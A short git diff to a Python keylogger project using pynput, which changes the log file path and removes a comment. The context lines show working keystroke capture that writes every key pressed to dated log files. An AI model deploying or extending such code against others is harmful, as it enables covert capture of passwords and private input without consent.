@@ -3,7 +3,7 @@ from datetime import datetime
 import logging
 
 todays_date = datetime.now().strftime('%Y-%b-%d')
-log_dir = "C:\\Users\\Jemak\\Desktop\\forked\\KeyLoggerPyNput\\Logs\\"
+log_dir = "C:\\Users\\user\\Logs\\"
 
 logging.basicConfig(filename=(log_dir + todays_date + '.txt'), level=logging.DEBUG, format='%(asctime)s: %(message)s')
 
@@ -24,6 +24,5 @@ def on_press(key):
         else:
             stri += ' '
 
-# Collect events until released
 with keyboard.Listener(on_press=on_press) as listener:
     listener.join()
